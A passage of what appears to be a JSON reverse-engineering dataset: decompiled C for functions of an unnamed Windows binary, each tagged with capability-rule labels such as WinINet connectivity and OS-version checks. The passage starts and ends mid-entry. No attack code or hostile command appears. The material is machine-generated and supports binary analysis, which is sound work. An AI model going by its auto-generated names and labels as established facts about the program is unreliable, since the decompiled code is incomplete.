var_94h = fcn.00077b60(arg_8h, var_9ch, var_98h, puVar2, 0);\n                            if (var_94h != NULL) break;\n                            if (var_9ch == NULL) goto code_r0x000284d4;\n                            var_4h = fcn.00023660(var_48h, var_44h, var_8ch, var_8h, var_a0h, var_9ch);\n                            fcn.00077b30(arg_8h, var_a0h, 0);\n                            if (var_4h != 0) {\n                                var_94h = var_4h + 0x191U | 0x21590000;\n                                break;\n                            }\n                            var_8h = var_8h + var_9ch;\n                        }\n                    }\n                }\n                else {\n                    var_94h = 0x215901f6;\n                }\n            }\n            else {\n                var_94h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            do {\n                var_a0h = &var_90h;\n                iVar1 = fcn.000235a0(var_48h, var_44h, &var_40h, var_a0h);\n                if (iVar1 != 0) {\n                    var_4h = fcn.00023620(var_48h, var_44h, var_40h, var_2bh, &var_27h, &var_8ch);\n                    if (var_4h == 0) goto code_r0x000283bb;\n                    var_94h = var_4h + 0x191U | 0x21590000;\n                    goto code_r0x0002850a;\n                }\n                var_4h = fcn.000236f0(var_48h, var_44h, var_8ch);\n            } while (var_4h == 0);\n            var_94h = var_4h + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x0002850a:\n    fcn.00035330(var_4ch);\n    *arg_18h = 0;\n    *arg_1ch = 0;\n    return var_94h;\n}\n",
        "token_count": 1419
    },
    "00028540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00028540(uint noname_0, uint noname_1, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_14h < 0x3d) {\n        var_54h = 0x21590064;\n    }\n    else {\n        var_8h = arg_10h;\n        fcn.00026bb0(arg_10h);\n        if ((*(var_8h + 3) & 1) == 0) {\n            var_4h = fcn.000235a0(*var_8h, var_8h[1], var_8h + 2, &var_50h);\n            if (var_4h == 0) {\n                var_4h = fcn.000236f0(*var_8h, var_8h[1], var_4ch);\n            }\n        }\n        else {\n            var_4h = fcn.00028610(*var_8h, var_8h[1], var_8h[2] + 1);\n        }\n        if (var_4h == 0) {\n            var_54h = 0;\n        }\n        else {\n            var_54h = var_4h + 0x191U | 0x21590000;\n        }\n    }\n    fcn.00035330(var_ch);\n    return var_54h;\n}\n",
        "token_count": 371
    },
    "00028610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00028610(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = 0;\n    var_8h = fcn.00023560(arg_8h, arg_ch, &var_4h, &var_14h);\n    if (var_8h == 0) {\n        var_10h = 0;\n        for (var_ch = 0; var_ch < var_4h; var_ch = var_ch + 1) {\n            if ((arg_10h <= *(var_14h + 0xc + var_ch * 0x40)) && ((*(var_14h + 0xc + var_ch * 0x40) & 0x80000000) == 0))\n            {\n                *(var_14h + 4 + var_ch * 0x40) = 0xffffffff;\n            }\n        }\n        fcn.00023720(var_14h, var_4h);\n        fcn.00023800(var_14h);\n    }\n    else {\n        var_10h = var_8h + 0x191U | 0x21590000;\n    }\n    return var_10h;\n}\n",
        "token_count": 319
    },
    "000286d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000286d0(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    *arg_10h = 0;\n    iVar1 = fcn.00029510(&var_10h, 0x10, 0x228);\n    if (iVar1 == 0) {\n        iVar1 = fcn.000203c0(&var_10h, 0x10, *arg_8h, *arg_ch);\n        if (iVar1 == -1) {\n            uVar2 = 0x215901fa;\n        }\n        else {\n            arg_10h_00 = fcn.00035200(iVar1);\n            if (arg_10h_00 == 0) {\n                uVar2 = 0x21590004;\n            }\n            else {\n                fcn.00020410(&var_10h, 0x10, arg_10h_00, *arg_8h, *arg_ch);\n                *arg_8h = arg_10h_00;\n                *arg_ch = iVar1;\n                *arg_10h = arg_10h_00;\n                uVar2 = 0;\n            }\n        }\n    }\n    else {\n        uVar2 = 0x215901f9;\n    }\n    return uVar2;\n}\n",
        "token_count": 347
    },
    "000287e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000287e0(int32_t arg_8h)\n\n{\n    fcn.00024380();\n    if (arg_8h != 0) {\n        fcn.000209a0(5000);\n        fcn.00023d90(0xb1c68620, *0xb1c68604);\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "00028880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00028880(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint var_30h;\n    int32_t var_2ch;\n    uint8_t *var_24h;\n    uint8_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    if (*0xb1c59dd8 == 0) {\n        var_8h = 0;\n    }\n    else {\n        fcn.00034550(0xb1c59dd4);\n        for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n            if (*(*0xb1c59dd8 + var_4h * 0x1a0) != 0) {\n                var_ch = arg_8h;\n                var_10h = *0xb1c59dd8 + 4 + var_4h * 0x1a0;\n                do {\n                    uVar1 = *var_10h;\n                    bVar2 = uVar1 < *var_ch;\n                    if (uVar1 != *var_ch) {\ncode_r0x00028935:\n                        var_18h = (1 - bVar2) - (bVar2 != 0);\n                        goto code_r0x0002893d;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = var_10h[1];\n                    bVar2 = uVar1 < var_ch[1];\n                    if (uVar1 != var_ch[1]) goto code_r0x00028935;\n                    var_10h = var_10h + 2;\n                    var_ch = var_ch + 2;\n                } while (uVar1 != 0);\n                var_18h = 0;\ncode_r0x0002893d:\n                if (var_18h == 0) {\n                    var_20h = arg_8h + 0x80;\n                    var_24h = *0xb1c59dd8 + 0x84 + var_4h * 0x1a0;\n                    do {\n                        uVar1 = *var_24h;\n                        bVar2 = uVar1 < *var_20h;\n                        if (uVar1 != *var_20h) {\ncode_r0x000289ae:\n                            var_2ch = (1 - bVar2) - (bVar2 != 0);\n                            goto code_r0x000289b6;\n                        }\n                        if (uVar1 == 0) break;\n                        uVar1 = var_24h[1];\n                        bVar2 = uVar1 < var_20h[1];\n                        if (uVar1 != var_20h[1]) goto code_r0x000289ae;\n                        var_24h = var_24h + 2;\n                        var_20h = var_20h + 2;\n                    } while (uVar1 != 0);\n                    var_2ch = 0;\ncode_r0x000289b6:\n                    if (var_2ch == 0) {\n                        var_8h = *(*0xb1c59dd8 + var_4h * 0x1a0);\n                        *(*0xb1c59dd8 + var_4h * 0x1a0) = 0;\n                        break;\n                    }\n                }\n            }\n        }\n        fcn.000345c0(0xb1c59dd4);\n    }\n    return var_8h;\n}\n",
        "token_count": 841
    },
    "00028a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00028a10(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t var_4h;\n    \n    if ((arg_8h == 0) || (*0xb1c59dd8 == 0)) {\n        return;\n    }\n    fcn.00034550(0xb1c59dd4);\n    var_4h = 0;\n    while( true ) {\n        if (0x13 < var_4h) goto code_r0x00028aba;\n        if (*(*0xb1c59dd8 + var_4h * 0x1a0) == 0) break;\n        var_4h = var_4h + 1;\n    }\n    *(*0xb1c59dd8 + var_4h * 0x1a0) = arg_8h;\n    puVar3 = arg_ch;\n    puVar4 = *0xb1c59dd8 + 4 + var_4h * 0x1a0;\n    for (iVar2 = 0x65; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    uVar1 = fcn.0006be20();\n    *(*0xb1c59dd8 + 0x19c + var_4h * 0x1a0) = uVar1;\n    arg_8h = 0;\ncode_r0x00028aba:\n    fcn.000345c0(0xb1c59dd4);\n    if (arg_8h == 0) {\n        return;\n    }\n    fcn.00077140(&arg_8h, 0);\n    return;\n}\n",
        "token_count": 447
    },
    "00028ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.00028ae0(void)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    do {\n        iVar1 = fcn.000340e0(0xb1c59c94, 30000);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00034550(0xb1c59dd4);\n        for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n            if (*(*0xb1c59dd8 + var_4h * 0x1a0) != 0) {\n                iVar1 = fcn.0006be20();\n                if (300000 < iVar1 - *(*0xb1c59dd8 + 0x19c + var_4h * 0x1a0)) {\n                    fcn.00077140(var_4h * 0x1a0 + *0xb1c59dd8, 0);\n                    *(*0xb1c59dd8 + var_4h * 0x1a0) = 0;\n                    break;\n                }\n            }\n        }\n        fcn.000345c0(0xb1c59dd4);\n    } while( true );\n}\n",
        "token_count": 308
    },
    "00028ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.00028ba0(uint arg_8h, uint noname_1, int32_t arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            int32_t arg_20h)\n\n{\n    uint *puVar1;\n    uint arg_14h_00;\n    int32_t iVar2;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint32_t var_270h;\n    uint *var_26ch;\n    uint var_268h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_5ch = 0;\n    var_270h = 0;\n    var_4h = 0;\n    var_18h = fcn.00029470(1, 0);\n    if (arg_20h == 0) {\n        var_64h = arg_10h;\n        var_60h = 0;\n        var_14h = 0;\n        while( true ) {\n            if ((arg_14h <= var_60h) || (0x7f < var_14h)) goto code_r0x00028edc;\n            if (arg_14h < var_60h + 0x19U) break;\n            var_5ch = fcn.00035490(*(var_64h + var_60h));\n            if (arg_14h - var_60h < var_5ch) {\n                var_270h = 0x21590201;\n                goto code_r0x00028edc;\n            }\n            var_60h = var_60h + 4;\n            puVar1 = var_64h + var_60h;\n            var_288h = *puVar1;\n            var_284h = puVar1[1];\n            var_280h = puVar1[2];\n            var_27ch = puVar1[3];\n            var_278h = puVar1[4];\n            var_274h._0_1_ = *(puVar1 + 5);\n            fcn.00026b30(&var_288h);\n            if (var_4h == 0) {\n                var_ch = fcn.00023520(var_18h, 9, var_284h, var_64h + var_60h, var_5ch, 0);\n                if (var_ch == 0) {\n                    (&var_268h)[var_14h] = var_284h;\n                }\n                else {\n                    var_270h = var_ch + 0x191U | 0x21590000;\n                    fcn.000274e0(var_284h, var_270h, 0, 0);\n                    var_4h = 1;\n                }\n            }\n            else {\n                fcn.000274e0(var_284h, 0x21590006, 0, 0);\n            }\n            var_60h = var_60h + var_5ch;\n            var_14h = var_14h + 1;\n        }\n        var_270h = 0x21590201;\n    }\n    else {\n        arg_14h_00 = fcn.00029470(400, 20000);\n        for (var_14h = 0; var_26ch = NULL,  var_14h < 0x80; var_14h = var_14h + 1) {\n            var_270h = fcn.00077b60(arg_8h, &var_26ch, &var_5ch, arg_14h_00, 0);\n            if (var_270h != 0) {\n                var_270h = 0x21590201;\n                break;\n            }\n            if (var_5ch == 0) break;\n            if (var_5ch < 0x15) {\n                var_270h = 0x21590201;\n                break;\n            }\n            var_288h = *var_26ch;\n            var_284h = var_26ch[1];\n            var_280h = var_26ch[2];\n            var_27ch = var_26ch[3];\n            var_278h = var_26ch[4];\n            var_274h._0_1_ = *(var_26ch + 5);\n            fcn.00026b30(&var_288h);\n            if (var_4h == 0) {\n                var_ch = fcn.00023520(var_18h, 9, var_284h, var_26ch, var_5ch, 0);\n                if (var_ch == 0) {\n                    (&var_268h)[var_14h] = var_284h;\n                }\n                else {\n                    var_270h = var_ch + 0x191U | 0x21590000;\n                    fcn.000274e0(var_284h, var_270h, 0, 0);\n                    var_4h = 1;\n                }\n            }\n            else {\n                fcn.000274e0(var_284h, 0x21590006, 0, 0);\n            }\n            fcn.00077b30(arg_8h, var_26ch, 0);\n        }\n        fcn.00077b30(arg_8h, var_26ch, 0);\n    }\ncode_r0x00028edc:\n    if (var_270h == 0) {\n        for (var_10h = 0; var_10h < var_14h; var_10h = var_10h + 1) {\n            iVar2 = fcn.000235a0(var_18h, 9, &var_268h + var_10h, &var_58h);\n            if ((iVar2 == 0) && (iVar2 = fcn.00023750(var_58h, var_50h, var_54h, 0, &var_8h),  iVar2 != 0)) {\n                fcn.000236f0(var_58h, var_50h, var_54h);\n            }\n        }\n        fcn.00025e50();\n    }\n    else {\n        for (var_10h = 0; var_10h < var_14h; var_10h = var_10h + 1) {\n            iVar2 = fcn.000235a0(var_18h, 9, &var_268h + var_10h, &var_58h);\n            if (iVar2 == 0) {\n                fcn.000236f0(var_58h, var_50h, var_54h);\n            }\n        }\n    }\n    return var_270h;\n}\n",
        "token_count": 1627
    },
    "00029040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00029040(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.00029570(&var_14h, 0x10);\n    if (iVar1 == 0) {\n        *arg_8h = 0xfffffffd;\n    }\n    else {\n        if (iVar1 != 5) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n        *arg_8h = 0xfffffffe;\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "000290b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.000290b0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint32_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint32_t arg_8h_00;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_38h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_4h = 0;\n    var_8h = -2;\n    if (arg_8h == 3) {\n        var_ch = fcn.00029570(&var_20h, 0x10);\n        if (var_ch == 0) {\n            var_8h = -3;\n        }\n        else if (var_ch != 5) {\n            return var_ch;\n        }\n    }\n    if ((var_8h == -2) && (var_ch = fcn.00029510(&var_20h, 0x10, 0x229),  var_ch != 0)) {\n        return var_ch;\n    }\n    if (arg_1ch == 0) {\n        var_ch = fcn.000235a0(var_8h, arg_8h, &arg_ch, &var_68h);\n    }\n    else {\n        var_ch = fcn.000235e0(var_8h, arg_8h, arg_ch, &var_68h);\n    }\n    if (var_ch != 0) {\n        return var_ch;\n    }\n    var_10h = fcn.00035200(var_38h);\n    if (var_10h == 0) {\n        return -1;\n    }\n    var_ch = fcn.000236a0(var_8h, arg_8h, var_64h, 0, var_10h, var_38h, &var_24h);\n    if (var_ch == 0) {\n        arg_8h_00 = fcn.000203c0(&var_20h, 0x10, var_10h, var_24h);\n        if (arg_8h_00 == 0xffffffff) {\n            var_ch = -1;\n        }\n        else {\n            if (arg_14h < arg_8h_00) {\n                if (arg_14h == 0) {\n                    *arg_18h = arg_8h_00;\n                }\n                else {\n                    var_4h = fcn.00035200(arg_8h_00);\n                    if (var_4h == 0) {\n                        var_ch = -1;\n                        goto code_r0x00029278;\n                    }\n                    fcn.00020410(&var_20h, 0x10, var_4h, var_10h, var_24h);\n                    fcn.0007877e(arg_10h, var_4h, arg_14h);\n                    *arg_18h = arg_14h;\n                    fcn.00035330(var_4h);\n                }\n            }\n            else {\n                fcn.00020410(&var_20h, 0x10, arg_10h, var_10h, var_24h);\n                *arg_18h = arg_8h_00;\n            }\n            var_ch = 0;\n        }\n    }\ncode_r0x00029278:\n    fcn.00035330(var_10h);\n    fcn.00035330(var_4h);\n    return var_ch;\n}\n",
        "token_count": 832
    },
    "000292c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000292c0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_24h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = -2;\n    if (arg_8h == 3) {\n        var_8h = fcn.00029570(&var_60h, 0x10);\n        if (var_8h == 0) {\n            var_4h = -3;\n        }\n        else if (var_8h != 5) {\n            return var_8h;\n        }\n    }\n    if ((var_4h != -2) || (var_8h = fcn.00029510(&var_60h, 0x10, 0x229),  var_8h == 0)) {\n        var_10h = fcn.000202d0(&var_60h, 0x10, arg_14h);\n        var_ch = fcn.00035200(var_10h);\n        if (var_ch == 0) {\n            var_8h = -1;\n        }\n        else {\n            var_10h = fcn.000202f0(&var_60h, 0x10, var_ch, arg_10h, arg_14h);\n            if (arg_1ch == 0) {\n                var_8h = fcn.00023520(var_4h, arg_8h, arg_ch, var_ch, var_10h, arg_18h);\n            }\n            else {\n                var_8h = fcn.000235a0(var_4h, arg_8h, &arg_ch, &var_50h);\n                if (var_8h == 0) {\n                    if (var_24h < var_10h) {\n                        fcn.000236f0(var_4h, arg_8h, var_4ch);\n                        var_8h = fcn.00023520(var_4h, arg_8h, arg_ch, var_ch, var_10h, arg_18h);\n                    }\n                    else {\n                        var_8h = fcn.00023790(var_4h, arg_8h, var_4ch);\n                        if (var_8h == 0) {\n                            var_8h = fcn.00023660(var_4h, arg_8h, var_4ch, 0, var_ch, var_10h);\n                        }\n                    }\n                }\n                else {\n                    var_8h = fcn.00023520(var_4h, arg_8h, arg_ch, var_ch, var_10h, arg_18h);\n                }\n            }\n            fcn.00035330(var_ch);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 693
    },
    "000294b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000294b0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_78h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    \n    fcn.0007865e(&var_68h, 0xb1be15f0, arg_ch);\n    var_6ch = &var_68h;\n    do {\n        cVar1 = *var_6ch;\n        var_6ch = var_6ch + 1;\n    } while (cVar1 != '\\0');\n    fcn.000292a0(arg_8h, &var_68h, var_6ch + (1 - (&var_68h + 1)));\n    return;\n}\n",
        "token_count": 175
    },
    "00029510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00029510(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_48h;\n    uint var_44h;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000235a0(0xfffffffe, 2, &arg_10h, &var_48h);\n    if (var_4h == 0) {\n        if (var_18h == arg_ch) {\n            var_4h = fcn.000236a0(0xfffffffe, 2, var_44h, 0, arg_8h, arg_ch, &arg_ch);\n        }\n        else {\n            var_4h = -1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 188
    },
    "00029570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00029570(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    var_4ch = 0x229;\n    var_4h = fcn.000235a0(0xfffffffd, 2, &var_4ch, &var_48h);\n    if (var_4h == 0) {\n        if (var_18h == arg_ch) {\n            var_4h = fcn.000236a0(0xfffffffd, 2, var_44h, 0, arg_8h, arg_ch, &arg_ch);\n        }\n        else {\n            var_4h = -1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 200
    },
    "000295d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000295d0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_440h;\n    int32_t var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint *var_428h;\n    int32_t var_424h;\n    uint var_420h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_14h = fcn.00023560(0xfffffffe, 2, &var_18h, &var_424h);\n    if (var_14h == 0) {\n        var_438h = 0x15;\n        var_434h = 3;\n        var_430h = 0x16;\n        var_42ch = 200;\n        var_8h = 0;\n        var_4h = 0;\n        var_10h = 2;\n        var_ch = &var_438h;\n        var_4h = fcn.000352f0(0x10, var_18h);\n        if (var_4h == 0) {\n            fcn.00023800(var_424h);\n            uVar1 = 0x21590004;\n        }\n        else {\n            for (var_1ch = 0; var_1ch < var_18h; var_1ch = var_1ch + 1) {\n                if ((((*(var_424h + 0xc + var_1ch * 0x40) != 0x227) && (*(var_424h + 0xc + var_1ch * 0x40) != 0x228)) &&\n                    (*(var_424h + 0xc + var_1ch * 0x40) != 0x229)) &&\n                   ((iVar2 = fcn.00029090(*(var_424h + 0xc + var_1ch * 0x40), &var_420h, 0x400, &var_43ch),  iVar2 == 0\n                    && (var_428h = fcn.00035200(var_10h * 0x10 + var_43ch),  var_428h != NULL)))) {\n                    fcn.00078790(var_428h, 0, var_10h << 4);\n                    var_428h[1] = var_428h + 2;\n                    *var_428h = 4;\n                    *var_428h[1] = *(var_424h + 0xc + var_1ch * 0x40);\n                    var_428h[4] = var_43ch;\n                    var_428h[5] = var_428h + var_10h * 4;\n                    fcn.0007877e(var_428h + var_10h * 4, &var_420h, var_43ch);\n                    *(var_4h + var_8h * 4) = var_428h;\n                    var_8h = var_8h + 1;\n                }\n            }\n            uVar1 = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n            for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n                fcn.00035330(*(var_4h + var_1ch * 4));\n            }\n            fcn.00035330(var_4h);\n            fcn.00023800(var_424h);\n        }\n    }\n    else {\n        uVar1 = var_14h + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 939
    },
    "00029880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00029880(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    char *arg_ch;\n    uint var_24h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00020650(arg_10h, 0x13, 3, &var_8h, 4);\n    if (iVar2 == 0) {\n        var_10h = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.000205e0(arg_10h, 0x14, 4, &var_4h, &var_ch);\n        if (iVar2 == 0) {\n            var_10h = 0x21590066;\n        }\n        else {\n            arg_8h = fcn.00037470(var_4h);\n            arg_ch = fcn.00035200(arg_8h);\n            if (arg_ch == NULL) {\n                var_10h = 0x21590004;\n            }\n            else {\n                fcn.000373f0(var_4h, arg_ch, 0xffffffff);\n                var_18h = arg_ch;\n                do {\n                    cVar1 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while (cVar1 != '\\0');\n                iVar2 = fcn.000292a0(var_8h, arg_ch, var_18h + (1 - (arg_ch + 1)));\n                if (iVar2 == 0) {\n                    var_10h = 0;\n                }\n                else {\n                    var_10h = 0x215901fb;\n                }\n                fcn.00035330(arg_ch);\n            }\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 457
    },
    "000299f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000299f0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    *arg_14h = 3;\n    var_14h = fcn.00023560(0xfffffffe, 4, &var_1ch, &var_20h);\n    if (var_14h == 0) {\n        var_ch = NULL;\n        var_8h = 0;\n        var_4h = 0;\n        var_10h = 7;\n        var_ch = fcn.000352f0(7, 8);\n        if (var_ch == NULL) {\n            var_24h = 0x21590004;\n        }\n        else {\n            *var_ch = 1;\n            var_ch[1] = 8;\n            var_ch[2] = 0xe;\n            var_ch[3] = 3;\n            var_ch[4] = 2;\n            var_ch[5] = 7;\n            var_ch[6] = 3;\n            var_ch[7] = 7;\n            var_ch[8] = 4;\n            var_ch[9] = 2;\n            var_ch[10] = 0xf;\n            var_ch[0xb] = 2;\n            var_ch[0xc] = 5;\n            var_ch[0xd] = 